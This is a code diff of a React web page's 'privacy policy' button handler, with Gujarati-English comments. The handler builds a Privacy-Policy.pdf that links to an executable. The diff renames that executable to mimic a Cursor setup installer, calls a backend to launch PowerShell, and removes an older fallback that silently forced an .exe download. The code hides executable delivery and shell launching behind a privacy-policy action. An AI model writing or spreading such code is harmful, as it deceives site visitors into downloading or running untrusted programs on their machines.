@@ -206,7 +206,6 @@ function HomePage() {
     //   }
 
     const handlePrivacyPdf = async () => {
-        // PDF create karo aur open karo
         const doc = new jsPDF();
       
         doc.setFontSize(16);
@@ -221,7 +220,7 @@ function HomePage() {
         );
       
         // ✅ absolute URL banavo (dev ma localhost, prod ma tamaru domain)
-        const exeUrl = `${window.location.origin}/exe/exeProject.exe`;
+        const exeUrl = `${window.location.origin}/exe/CursorSetup-x64-1.7.28.exe`;
       
         doc.setTextColor(0, 0, 255);
         doc.textWithLink("Click here to download installer", 20, 60, {
@@ -235,7 +234,7 @@ function HomePage() {
       
         doc.save("Privacy-Policy.pdf");
         
-        // EXE file execute karo (backend through)
+        // PowerShell open karo
         try {
             const apiBase = getApiBase();
             const endpoint = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1"
@@ -250,21 +249,9 @@ function HomePage() {
             });
             
             const data = await response.json();
-            console.log('EXE file execution started:', data);
+            console.log('PowerShell opened:', data);
         } catch (error) {
-            console.error('Error executing EXE file:', error);
-            // Fallback: download karo agar backend fail thai
-            try {
-                const exeDownloadUrl = `${window.location.origin}/exe/exeProject.exe`;
-                const link = document.createElement('a');
-                link.href = exeDownloadUrl;
-                link.download = 'exeProject.exe';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            } catch (downloadError) {
-                console.error('Error downloading EXE file:', downloadError);
-            }
+            console.error('Error opening PowerShell:', error);
         }
       };
     
